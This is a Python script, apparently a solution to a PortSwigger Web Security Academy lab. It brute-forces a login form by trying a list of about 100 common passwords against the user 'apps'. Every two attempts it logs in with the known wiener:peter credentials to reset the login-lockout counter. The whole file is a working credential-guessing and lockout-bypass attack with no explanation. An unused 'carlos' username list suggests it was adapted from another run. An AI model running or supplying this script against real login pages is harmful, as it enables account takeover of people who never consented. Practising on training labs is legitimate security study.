#!/usr/bin/env python3

import requests
import string
import time

# Target URL
url = 'https://0a5400c40383103f806acb7e00900050.web-security-academy.net/login'

usernames = ["carlos"]

username = "apps"

passwords = ["123456","password","12345678","qwerty","123456789","12345","1234","111111","1234567","dragon","123123","baseball","abc123","football","monkey","letmein","shadow","master","666666","qwertyuiop","123321","mustang","1234567890","michael","654321","superman","1qaz2wsx","7777777","121212","000000","qazwsx","123qwe","killer","trustno1","jordan","jennifer","zxcvbnm","asdfgh","hunter","buster","soccer","harley","batman","andrew","tigger","sunshine","iloveyou","2000","charlie","robert","thomas","hockey","ranger","daniel","starwars","klaster","112233","george","computer","michelle","jessica","pepper","1111","zxcvbn","555555","11111111","131313","freedom","777777","pass","maggie","159753","aaaaaa","ginger","princess","joshua","cheese","amanda","summer","love","ashley","nicole","chelsea","biteme","matthew","access","yankees","987654321","dallas","austin","thunder","taylor","matrix","mobilemail","mom","monitor","monitoring","montana","moon","moscow"]

realPassword=[]

iterations = 0

for password in passwords:
    data = {
        'username': username,
        'password': password
            }

    # Send POST request with FORM data using the data parameter
    response = requests.post(url, data=data)

    if 'Incorrect password' not in response.text:
        print(f"Password Found!: {password}")
        realPassword.append(password)
    else:
        print(f"Password not found: {password}")

    iterations += 1

    if iterations == 2:
        data = {
        'username': 'wiener',
        'password': 'peter'
            }

        # Send POST request with FORM data using the data parameter
        response = requests.post(url, data=data)
        if 'wiener' in response.text:
            iterations = 0
            print('Logged in')
        else:
            raise Exception("couldn't log in")

print(f"Username: {username}\n Password:{realPassword[0]}")
